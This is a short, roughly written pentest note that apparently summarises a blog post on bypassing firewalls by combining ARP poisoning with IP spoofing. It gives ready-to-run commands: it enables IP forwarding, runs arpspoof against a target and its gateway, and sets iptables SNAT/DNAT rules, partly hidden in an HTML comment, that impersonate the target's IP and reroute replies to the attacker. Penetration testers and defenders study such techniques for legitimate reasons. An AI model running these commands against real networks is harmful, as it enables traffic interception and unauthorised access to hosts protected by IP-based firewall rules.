# Combining ARP poisoning and IP spoofing
## To bypass firewalls

https://idafchev.github.io/pentest/2019/10/28/combining_arp_poisoning_and_ip_spoofing_to_bypass_firewalls.html

1. Enable routing on your host. 
Host Route : A route to a specific internetwork address (Network ID and Host ID). Host routes allow intelligent routing decisions to be made for each network address. Host routes are used to create custom routes to control or optimize specific types of network traffic

`sysctl net.ipv4.ip_forward=1`

2. use arpspoof
arpspoof command- 
`arpspoof -i eth0 -t 172.16.2.10 -r 172.16.2.2`

3. Now we need to
    tag our spoofed traffic somehow

        To tag the spoofed packets we could use the source tcp ports. Windows and Linux use specific port ranges for the source ports when initiating a new connection. For Windows this can be found with the command:

        `netsh int ipv4 show dynamicport tcp`

    Dont route the response of the tagged traffic

    Accept the tagged traffic as it was destined to the attackers host

4. # Enable routing
sysctl net.ipv4.ip_forward=1

5. Tagging is down by chaning prerouting and postrouting rules .
<!-- # Change the source port range of the attacker host

echo "40000 50000" > /proc/sys/net/ipv4/ip_local_port_range

# The outgoing packets sourced by the attacker's host (their source 
# IP is 172.16.2.20) have their source IP changed to the target 
# IP (172.16.2.10) and the source port range moved to another range.
# 
# This basically tags the outgoing traffic by spoofing the IP 
# and modifying the source ports.

iptables -t nat -A POSTROUTING -s 172.16.2.20/32 -o eth0 -p tcp -j SNAT --to-source 172.16.2.10:20000-30000

# Incoming traffic which has the target host as it's destination (172.16.2.10)
# and has destination port in the range of 20000:30000 is changed to the 
# attacker IP (172.16.2.20) and the port range is restored to 40000:50000.
# 
# This basically identifies the response of the spoofed traffic and changes
# it in order to be routed to the attacker's host.
iptables -t nat -A PREROUTING -d 172.16.2.10/32 -i eth0 -p tcp -m tcp --dport 20000:30000 -j DNAT --to-destination 172.16.2.20:40000-50000

# Start the MITM attack -->
sudo arpspoof -i eth0 -t 172.16.2.10 -r 172.16.2.2


